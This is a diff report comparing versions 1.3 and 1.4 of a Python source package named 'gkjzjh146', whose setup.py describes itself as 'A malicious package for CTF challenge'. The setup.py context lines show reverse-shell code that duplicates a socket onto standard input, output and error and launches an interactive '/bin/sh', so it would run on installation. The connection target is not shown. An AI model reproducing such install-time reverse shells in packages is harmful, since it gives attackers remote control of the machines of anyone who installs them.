# Comparing `tmp/gkjzjh146-1.3.tar.gz` & `tmp/gkjzjh146-1.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\gkjzjh146-1.3.tar", last modified: Sun May 14 04:45:55 2023, max compression
+gzip compressed data, was "dist\gkjzjh146-1.4.tar", last modified: Sun May 14 05:54:29 2023, max compression
```

## Comparing `gkjzjh146-1.3.tar` & `gkjzjh146-1.4.tar`

### file list

```diff
@@ -1,12 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-05-14 04:45:55.000000 gkjzjh146-1.3/
--rw-rw-rw-   0        0        0      159 2023-05-14 04:45:55.000000 gkjzjh146-1.3/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-14 04:45:55.000000 gkjzjh146-1.3/gkjzjh146/
--rw-rw-rw-   0        0        0      196 2023-05-14 03:09:06.000000 gkjzjh146-1.3/gkjzjh146/gkj2jh146.py
-drwxrwxrwx   0        0        0        0 2023-05-14 04:45:55.000000 gkjzjh146-1.3/gkjzjh146.egg-info/
--rw-rw-rw-   0        0        0      159 2023-05-14 04:45:55.000000 gkjzjh146-1.3/gkjzjh146.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      195 2023-05-14 04:45:55.000000 gkjzjh146-1.3/gkjzjh146.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-14 04:45:55.000000 gkjzjh146-1.3/gkjzjh146.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-14 04:45:55.000000 gkjzjh146-1.3/gkjzjh146.egg-info/requires.txt
--rw-rw-rw-   0        0        0       10 2023-05-14 04:45:55.000000 gkjzjh146-1.3/gkjzjh146.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-14 04:45:55.000000 gkjzjh146-1.3/setup.cfg
--rw-rw-rw-   0        0        0     1160 2023-05-14 04:45:51.000000 gkjzjh146-1.3/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-14 05:54:29.000000 gkjzjh146-1.4/
+-rw-rw-rw-   0        0        0      159 2023-05-14 05:54:29.000000 gkjzjh146-1.4/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146/
+-rw-rw-rw-   0        0        0      241 2023-05-14 05:53:29.000000 gkjzjh146-1.4/gkjzjh146/__init__.py
+-rw-rw-rw-   0        0        0       74 2023-05-14 05:47:40.000000 gkjzjh146-1.4/gkjzjh146/module.py
+drwxrwxrwx   0        0        0        0 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/
+-rw-rw-rw-   0        0        0      159 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      214 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       10 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-14 05:54:29.000000 gkjzjh146-1.4/setup.cfg
+-rw-rw-rw-   0        0        0     1160 2023-05-14 05:53:29.000000 gkjzjh146-1.4/setup.py
```

### Comparing `gkjzjh146-1.3/setup.py` & `gkjzjh146-1.4/setup.py`

 * *Files 12% similar despite different names*

```diff
@@ -20,15 +20,15 @@
     os.dup2(s.fileno(), 0)
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     p = subprocess.call(["/bin/sh", "-i"])
 
 setup(
     name='gkjzjh146',
-    version='1.3',
+    version='1.4',
     author='Your Name',
     author_email='your_email@example.com',
     description='A malicious package for CTF challenge',
     packages=['gkjzjh146'],
     install_requires=[
         'requests',  # 举例：添加你需要的依赖项
     ],
```

